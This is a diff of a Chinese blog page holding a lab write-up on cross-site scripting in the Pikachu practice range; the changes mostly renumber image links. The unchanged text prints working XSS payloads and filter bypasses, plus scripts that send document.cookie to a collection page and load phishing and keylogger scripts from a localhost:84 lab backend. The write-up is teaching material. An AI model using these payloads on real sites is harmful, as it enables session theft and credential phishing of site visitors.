@@ -26,43 +26,43 @@
 <meta property="og:site_name" content="llppff573">
 <meta property="og:description" content="XSS 跨站脚本攻击XSS基本概念和原理介绍XSS（Cross‑Site Scripting）跨站脚本漏洞。漏洞根源：服务端接收用户可控输入，没有做过滤与转义，将数据直接输出到前端HTML页面，浏览器会把用户输入当做JS代码解析执行。 攻击发生在受害者浏览器端，不是攻击服务器本身。攻击者可以实现行为：  窃取受害者Cookie会话凭证 伪造页面内容，实施钓鱼攻击 劫持页面DOM，读取页面敏感数据">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/32.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/33.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/34.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/24.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/23.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/25.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/26.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/35.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/36.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/37.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/26.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/28.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/29.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/30.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/31.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/35.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/36.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/37.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/32.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/33.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/34.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/38.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/39.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/40.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/41.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/42.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/43.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/44.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/45.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/46.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/44.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/47.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/48.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/49.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/47.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/50.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/51.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/52.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/53.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/54.png">
 <meta property="article:published_time" content="2026-09-15T02:00:00.000Z">
-<meta property="article:modified_time" content="2026-09-16T11:33:05.286Z">
+<meta property="article:modified_time" content="2026-09-18T11:13:06.983Z">
 <meta property="article:author" content="llppff573">
 <meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="XSS">
 <meta property="article:tag" content="跨站脚本">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/32.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/35.png">
   
   
   
@@ -431,12 +431,12 @@
 </ol>
 <h2 id="XSS实验"><a href="#XSS实验" class="headerlink" title="XSS实验"></a>XSS实验</h2><h3 id="反射型XSS‑GET"><a href="#反射型XSS‑GET" class="headerlink" title="反射型XSS‑GET"></a>反射型XSS‑GET</h3><ol>
 <li><p>随机输入测试的内容，发现内容直接拼接在URL的GET参数中，页面回显输入内容。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/32.png" srcset="/img/loading.gif" lazyload alt="反射型XSS‑GET随机输入" width="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/35.png" srcset="/img/loading.gif" lazyload alt="反射型XSS‑GET随机输入" width="700"/></li>
 <li><p>修改输入的最大限制并输入基础测试Payload：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，点击提交。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/33.png" srcset="/img/loading.gif" lazyload alt="反射型XSS‑GET输入payload" width="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/36.png" srcset="/img/loading.gif" lazyload alt="反射型XSS‑GET输入payload" width="700"/>
 </li>
 <li><p>页面弹出alert弹窗，代表漏洞存在；观察浏览器地址栏，恶意脚本完整出现在URL参数中。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/34.png" srcset="/img/loading.gif" lazyload alt="反射GET弹窗效果，观察URL参数" width="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/37.png" srcset="/img/loading.gif" lazyload alt="反射GET弹窗效果，观察URL参数" width="700"/>
 </li>
 <li><p>将完整构造好的URL发给受害者，受害者访问该链接即可触发脚本。</p>
 </li>
@@ -447,69 +447,69 @@
 <h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>原理：恶意 JS 代码存入后端数据库，访问留言页面时，后端读取数据库内容渲染页面，页面加载就会自动执行恶意脚本。</p>
 <ol>
 <li><p>在页面的留言板中随意输入一些字符，然后可以观察到页面留言列表出现了刚才的内容。用户输入的内容直接拼接在URL的GET参数中，页面回显输入内容。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/24.png" srcset="/img/loading.gif" lazyload alt="存储型输入payload" width="700"/>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/23.png" srcset="/img/loading.gif" lazyload alt="存储型页面源码显示拼接" width="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/27.png" srcset="/img/loading.gif" lazyload alt="存储型输入payload" width="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/26.png" srcset="/img/loading.gif" lazyload alt="存储型页面源码显示拼接" width="700"/>
 </li>
 <li><p>输入一些特殊字符进行测试，观察是否会原样输出内容。很明显可以看出，留言列表多了刚才输入的测试内容并且无变化，没有过滤。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/25.png" srcset="/img/loading.gif" lazyload alt="存储型页面测试特殊字符" width="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/28.png" srcset="/img/loading.gif" lazyload alt="存储型页面测试特殊字符" width="700"/>
 </li>
 <li><p>输入基础测试Payload：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，点击提交。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
 <li><p>页面弹出alert弹窗，代表漏洞存在；观察浏览器地址栏，恶意脚本完整出现在URL参数中。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/26.png" srcset="/img/loading.gif" lazyload alt="存储型页面弹窗" width="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/29.png" srcset="/img/loading.gif" lazyload alt="存储型页面弹窗" width="700"/>
 </li>
 <li><p>观察对应源码，是简单的插入数据，存入后台，每次刷新页面都会读取。</p>
 </li>
 </ol>
 <h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><ol>
 <li><p>观察其页面源代码， 前端JS获取id&#x3D;”text”的内容赋予str，然后利用字符拼接写到href里面，不经过后台。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/27.png" srcset="/img/loading.gif" lazyload alt="DOM型XSS页面代码" width="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/30.png" srcset="/img/loading.gif" lazyload alt="DOM型XSS页面代码" width="700"/>
 </li>
 <li><p>根据原本前端代码构造闭合。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;#&#x27;</span><span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(111)&quot;</span>&gt;</span>what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>然后点击页面生成的what do you see?就会有对应的弹窗。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/28.png" srcset="/img/loading.gif" lazyload alt="DOM输入payload" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/31.png" srcset="/img/loading.gif" lazyload alt="DOM输入payload" idth="700"/>
 </li>
 <li><p>触发弹窗，证明漏洞存在。但是刷新以后不会再次弹窗。</p>
 </li>
 </ol>
 <h3 id="DOM型XSS-x"><a href="#DOM型XSS-x" class="headerlink" title="DOM型XSS-x"></a>DOM型XSS-x</h3><ol>
 <li><p>随便输入字符串发现弹出一句话，检查源码发现输入的内容从url里面赋值给了xss这个变量，然后写到a标签里面。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/29.png" srcset="/img/loading.gif" lazyload alt="DOM-x检查源码" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/32.png" srcset="/img/loading.gif" lazyload alt="DOM-x检查源码" idth="700"/>
 </li>
 <li><p>再次构造闭合，内容和xss一样，点击按钮后在点击a标签会生成弹窗。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/30.png" srcset="/img/loading.gif" lazyload alt="DOM-x输入payload" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/33.png" srcset="/img/loading.gif" lazyload alt="DOM-x输入payload" idth="700"/>
 可以生成恶意链接，危害更大。</li>
 </ol>
 <h3 id="通过Xss获取cookie及xss后台管理的使用"><a href="#通过Xss获取cookie及xss后台管理的使用" class="headerlink" title="通过Xss获取cookie及xss后台管理的使用"></a>通过Xss获取cookie及xss后台管理的使用</h3><ol>
 <li><p>输入账号密码，登录Xss后台，进入pikachu Xss 获取cookies结果（一会要用）。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/31.png" srcset="/img/loading.gif" lazyload alt="DOM-x输入payload" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/34.png" srcset="/img/loading.gif" lazyload alt="DOM-x输入payload" idth="700"/>
 </li>
 <li><p>还是使用反射型的页面，修改输入长度限制，输入一组重定向payload，形成一个完整的get请求，获取对应的cookie。</p>
 </li>
 </ol>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> =<span class="hljs-string">&#x27;http://localhost:84/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
-<p>3.到刚才的管理界面，就可以看到有了一条新的记录，就是我们刚才获取的cookie内容。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/35.png" srcset="/img/loading.gif" lazyload alt="DOM-x输入payload" idth="700"/></p>
+<p>3.到刚才的管理界面，就可以看到有了一条新的记录，就是我们刚才获取的cookie内容。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/38.png" srcset="/img/loading.gif" lazyload alt="DOM-x输入payload" idth="700"/></p>
 <p>可以利用这个构建一个URL，获取对应cookie。(本url仅使用于本人路径，请按需更改)</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://localhost:84/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Flocalhost%3A84%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27.concat(document.cookie)%3B%3C%2Fscript%3E&amp;submit=submit<br></code></pre></td></tr></table></figure>
-<p>同时，在管理员界面会新增一条数据。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/36.png" srcset="/img/loading.gif" lazyload alt="URl新增数据" idth="700"/></p>
+<p>同时，在管理员界面会新增一条数据。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/39.png" srcset="/img/loading.gif" lazyload alt="URl新增数据" idth="700"/></p>
 <h3 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h3><p>1.使用存储型XSS页面进行实验，将对应代码嵌入界面，每当用户访问界面，都会执行这段代码。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://localhost:84/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<p>2.提交后会生成一个弹窗，要求输入账号密码认证。并且每次访问都会刷新并弹窗。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/37.png" srcset="/img/loading.gif" lazyload alt="钓鱼弹窗" idth="700"/></p>
-<p>3.后台就可以获取钓鱼的结果，钓鱼结果显示页面有对应的数据。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/38.png" srcset="/img/loading.gif" lazyload alt="钓鱼新结构" idth="700"/></p>
+<p>2.提交后会生成一个弹窗，要求输入账号密码认证。并且每次访问都会刷新并弹窗。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/40.png" srcset="/img/loading.gif" lazyload alt="钓鱼弹窗" idth="700"/></p>
+<p>3.后台就可以获取钓鱼的结果，钓鱼结果显示页面有对应的数据。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/41.png" srcset="/img/loading.gif" lazyload alt="钓鱼新结构" idth="700"/></p>
 <h3 id="XSS-获取键盘记录"><a href="#XSS-获取键盘记录" class="headerlink" title="XSS 获取键盘记录"></a>XSS 获取键盘记录</h3><ol>
 <li><p>仍然选择存储型XSS页面，打开pikachu XSS后台，找到对应的pikachu Xss 获取键盘记录结果。此时结果页面没有数据。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/39.png" srcset="/img/loading.gif" lazyload alt="空白键盘记录" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/42.png" srcset="/img/loading.gif" lazyload alt="空白键盘记录" idth="700"/>
 </li>
 <li><p>构造一个恶意链接的闭合，本机适用以下代码：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://localhost:84/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>在页面随机键入，然后在后台就可以看到我们在页面随机输入的字符。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/40.png" srcset="/img/loading.gif" lazyload alt="键盘记录" idth="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/43.png" srcset="/img/loading.gif" lazyload alt="键盘记录" idth="700"/></li>
 </ol>
 <h3 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h3><ol>
 <li><p>在两个输入框中随机输入，页面会反馈：谢谢参与，阁下的看法我们已经收到!  得知我们在输入框的输入并不在前端输出。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/41.png" srcset="/img/loading.gif" lazyload alt="盲打随机键入" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/44.png" srcset="/img/loading.gif" lazyload alt="盲打随机键入" idth="700"/>
 </li>
 <li><p>在首个输入框中测试性输入以下代码，在下面输入框还是随机键入，观察变化，发现内容也不会在前段进行输出。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
@@ -517,8 +517,8 @@
 <li><p>然后进入后台，地址为：&#x2F;xssblind&#x2F;admin_login.php；进行账号密码登录，admin&#x2F;123456。登录后，页面将弹框，所以我们刚才的前端script标签是在后台界面可以看到的。并且我们可以看到之前的所有输入内容。</p>
 </li>
 </ol>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/42.png" srcset="/img/loading.gif" lazyload alt="盲打弹框" idth="700"/>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/43.png" srcset="/img/loading.gif" lazyload alt="盲打记录" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/45.png" srcset="/img/loading.gif" lazyload alt="盲打弹框" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/46.png" srcset="/img/loading.gif" lazyload alt="盲打记录" idth="700"/>
 
 <h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><ol>
 <li><p>关于前端绕过，以反射性XSS为例，仅仅在前端设置了一个输入长度限制，直接修改对应html前端代码（或者抓包重放）就可以绕过限制，所以前端的限制是较为简单的。</p>
@@ -526,33 +526,33 @@
 <li><p>大小写问题，区分大小写，仅仅过滤纯小写的前端html代码，例如：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIpt</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-number">111</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRipt</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>打开对应靶场页面，测试一下特殊字符：<script></script>“”：’’,观察页面源代码，发现标签被过滤了。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/45.png" srcset="/img/loading.gif" lazyload alt="代码过滤" idth="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/48.png" srcset="/img/loading.gif" lazyload alt="代码过滤" idth="700"/></li>
 </ol>
-<p>然后输入上面的html代码，弹窗如预想正常出现。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/46.png" srcset="/img/loading.gif" lazyload alt="代码过滤弹窗" idth="700"/></p>
+<p>然后输入上面的html代码，弹窗如预想正常出现。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/49.png" srcset="/img/loading.gif" lazyload alt="代码过滤弹窗" idth="700"/></p>
 <ol start="3">
 <li>拼凑：系统可能会将<script></script>等标签在输入中直接删除，所以只需要注意输入即可，例如：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- &lt;scr&lt;script&gt;ipt&gt;alert(111)&lt;/scr&lt;script&gt;ipt&gt; --&gt;</span>//这里被注释了，解除注释再使用<br></code></pre></td></tr></table></figure></li>
-<li>使用注释进行干扰，和拼凑类似，利用注释，例如：<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/44.png" srcset="/img/loading.gif" lazyload alt="注释代码" idth="700"/></li>
+<li>使用注释进行干扰，和拼凑类似，利用注释，例如：<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/47.png" srcset="/img/loading.gif" lazyload alt="注释代码" idth="700"/></li>
 </ol>
 <h3 id="XSS之htmlspecialchars绕过"><a href="#XSS之htmlspecialchars绕过" class="headerlink" title="XSS之htmlspecialchars绕过"></a>XSS之htmlspecialchars绕过</h3><ol>
 <li><p>切换到靶场对应的页面，然后进行特殊字符输入：111&lt;&gt;?|’’”，观察其页面源代码。发现一些除了单引号刚才输入的特殊字符都进行转义。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/47.png" srcset="/img/loading.gif" lazyload alt="ht测试" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/50.png" srcset="/img/loading.gif" lazyload alt="ht测试" idth="700"/>
 </li>
 <li><p>所以利用’进行构造闭合，再页面点击对应标签，发现弹窗如预期出现。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">q&#x27;onclick=&#x27;alert(1111)&#x27;<br></code></pre></td></tr></table></figure>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/48.png" srcset="/img/loading.gif" lazyload alt="ht弹窗" idth="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/51.png" srcset="/img/loading.gif" lazyload alt="ht弹窗" idth="700"/></li>
 </ol>
 <h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><ol>
 <li>打开对应界面，输入以下payload：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">javascript:alert(111)<br></code></pre></td></tr></table></figure>
-然后点击对应的标签，发现还是正常弹窗。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/49.png" srcset="/img/loading.gif" lazyload alt="href弹窗" idth="700"/></li>
+然后点击对应的标签，发现还是正常弹窗。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/52.png" srcset="/img/loading.gif" lazyload alt="href弹窗" idth="700"/></li>
 </ol>
 <h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><ol>
 <li><p>随机输入，观察页面源代码，发现输入的内容会放到js中。这部分代码对输入内容进行是否为0的判断，两者反馈不同。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/50.png" srcset="/img/loading.gif" lazyload alt="页面源码" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/53.png" srcset="/img/loading.gif" lazyload alt="页面源码" idth="700"/>
 </li>
 <li><p>所以构造相应的闭合，参考以下payload：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- x&#x27;&lt;/script&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&#x27; --&gt;</span><br></code></pre></td></tr></table></figure></li>
 <li><p>点击提交以后，页面会进行弹窗。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/51.png" srcset="/img/loading.gif" lazyload alt="js弹窗" idth="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/54.png" srcset="/img/loading.gif" lazyload alt="js弹窗" idth="700"/></li>
 </ol>
 <h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><ol>
 <li>XSS 漏洞本质：<strong>可控用户输入未经过滤、转义直接输出到前端</strong>；攻击执行点在受害者浏览器，服务器本身不会被执行恶意 JS。</li>
